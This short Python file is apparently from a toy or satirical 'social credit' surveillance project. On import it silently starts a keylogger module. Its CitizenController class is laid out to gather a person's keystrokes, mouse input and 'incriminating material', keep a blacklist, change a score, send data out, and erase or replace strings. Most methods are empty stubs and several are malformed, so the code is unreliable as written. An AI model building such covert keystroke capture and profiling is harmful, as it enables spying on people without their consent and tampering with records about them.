from dataClasses.dataClasses import Citizen

from modules.keylogger.keylogger import main

main()

class CitizenController:
    def __init__(self, citizen, id, blackList, failings) -> None:
        self.id = id
        self.citizen = citizen
        self.blackList = blackList
        self.failings = failings

    def getSocialCreditScore():
        return 0

    def sendData():
        return None
    
    def collect(self, keyInput, failings, incrematerial, proof, ping, mouseInput) -> Citizen:
        return Citizen(None, keyInput, incrematerial, proof, ping, mouseInput, failings)

    def adjustSocialCreditScore(self, value):
        self.citizen.socialCreditScore += value

    def process():
        pass

    def analyse(keyInput):
        pass

    def erase(stringToErase):
        pass

    def replace(stringToReplace):
        pass

    def getBlackList(self):
        return self.blackList


